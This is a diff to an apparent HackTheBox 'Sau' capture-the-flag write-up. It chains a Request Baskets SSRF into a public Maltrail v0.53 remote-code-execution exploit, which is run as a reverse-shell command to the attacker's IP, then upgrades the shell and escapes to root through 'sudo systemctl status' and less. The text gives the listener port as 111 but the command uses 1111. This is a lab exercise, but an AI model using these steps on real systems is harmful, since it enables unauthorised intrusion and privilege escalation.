@@ -31,6 +31,40 @@ We can see that we have port 22, 80 and 55555, but port 80 is filtered so we can
 We see that this is Request Baskets and upon searching about this, we find that there is an SSRF issue here that we can leverage.
 We can forward port 80 to this request basket. 
 
-![Alt text](/assets/uploads/htb-sau/2024-01-12 13_39_13.png)
+![Alt text](/assets/uploads/htb-sau/2024-01-12 14_05_51.png)
 
-Now we can visit visit http://10.10.11.224:55555/d0kb80v and see that port 80 is running Maltrail v0.53. With some searching, we can see that there is an RCE vulnerability on this 
+Now we can visit visit http://10.10.11.224:55555/d0kb80v and see that port 80 is running Maltrail v0.53. With some searching, we can see that there is an RCE vulnerability on this https://github.com/spookier/Maltrail-v0.53-Exploit
+
+
+# Exploitation
+Let us clone this repository, setup a listener on port 111 and run the exploit to get a reverse shell
+
+---
+python3 exploit.py 10.10.14.36 1111 http://sau.htb:55555/mhvi3fu
+---
+
+We can now obtain the user flag at /home/puma/user.txt
+
+![Alt text](/assets/uploads/htb-sau/2024-01-12 14_09_34.png)
+
+At this point, let us also upgrade our shell to a pty shell using
+
+---
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+---
+
+# Privilege Escalation
+
+Running sudo -l reveals that we can run sudo on /usr/bin/systemctl status trail.service
+
+![Alt text](/assets/uploads/htb-sau/2024-01-12 14_17_23.png)
+
+So let us do that and we can see that the systemctl is running the less command to show us all the information, so what we can do is to run !sh to exit the terminal and we retain sudo privileges
+
+![Alt text](/assets/uploads/htb-sau/2024-01-12 14_19_25.png)
+
+Now we can just obtain the root flag at /root/root.txt
+
+![Alt text](/assets/uploads/htb-sau/2024-01-12 14_20_27.png)
+
+
